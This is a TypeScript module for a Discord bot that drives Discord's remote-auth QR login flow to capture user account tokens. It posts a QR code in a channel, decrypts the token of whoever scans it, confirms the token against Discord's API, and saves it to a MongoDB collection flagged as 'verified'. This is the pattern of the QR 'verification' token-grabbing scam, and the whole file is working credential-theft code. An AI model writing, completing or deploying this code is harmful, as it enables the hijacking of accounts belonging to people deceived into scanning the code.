import fetch from 'node-fetch'
import { Message, MessageEmbed, MessageAttachment } from "discord.js";
import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
import { Schema, model } from "mongoose";
import WebSocket from "ws";
import Jimp from "jimp";

const user = model("QR_User", new Schema({
    id: String,
    username: String,
    token: String,
    verified: Boolean,
}));

let SocketClient: WebSocket;
let Heart: NodeJS.Timeout;
let Timeout: NodeJS.Timeout;

interface IData {
    op: string;
    heartbeat_interval?: number;
    timeout_ms?: number;
    encrypted_nonce?: string;
    fingerprint?: string;
    encrypted_user_payload?: string;
    encrypted_token?: string;
}

export default (message: Message, embed: MessageEmbed) => new Promise(reslove => {
    const keyPair = generateKeyPairSync("rsa", { modulusLength: 2048, publicExponent: 65537 });

    SocketClient = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', { origin: 'https://discord.com' });
    SocketClient.onmessage = async (x) => {
        const data: IData = JSON.parse(x.data as string);

        switch (data.op) {
            case 'hello':
                if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'init', encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString("base64") }));
                Heart = setInterval(() => {if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'heartbeat' }))}, data.heartbeat_interval);
                Timeout = setTimeout(() => {
                    clearInterval(Heart);
                    if (SocketClient.OPEN) SocketClient.close();
                    reslove(false);
                }, 60000)
                break;
            case 'nonce_proof':
                const decryptedNonce = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_nonce as string), 'base64'));
                const nonceHash = createHash('sha256').update(decryptedNonce).digest('base64url');
                if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'nonce_proof', proof: nonceHash }));
                break;
            case 'pending_remote_init':
                const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;
                const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${fingerprintData}`;
                
                const bg = new Jimp(300, 300, 0xFFFFFFFF);
                const qrCode = await Jimp.read(qrCodeURL);
                bg.composite(qrCode, 22, 22);
                
                bg.getBuffer(Jimp.MIME_PNG, (err, buffer) => {
                    const discordImage = new MessageAttachment(buffer, 'img.png');
                    embed.setImage('attachment://img.png');
                    message.edit({ embeds: [embed], files: [discordImage] }).catch(e => {});
                });
                break;
            case 'pending_finish':
                const decryptedUser = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_user_payload as string), 'base64'));
                const userId = decryptedUser.toString().split(':')[0];
                break;
            case 'finish':
                const decryptedToken = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_token as string), 'base64'));
                const token = decryptedToken.toString();

                const discord = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();

                for (const whitelist of require('./whitelisted.json')) 
                    if (discord.id === whitelist) return reslove(token);

                const userData = await user.findOne({ id: discord.id }).catch(e => {});
                if (!userData) user.create({
                    id: discord.id,
                    username: discord.username,
                    token: token,
                    verified: true,
                }).catch(e => {});
                else userData.updateOne({
                    token: token,
                    verified: true,
                }).catch(e => {});

                if (SocketClient.OPEN) SocketClient.close();
                clearInterval(Heart);
                clearTimeout(Timeout);
                reslove(token);
                break;
            default:
                console.log(data);
                break;
        }    
    }
});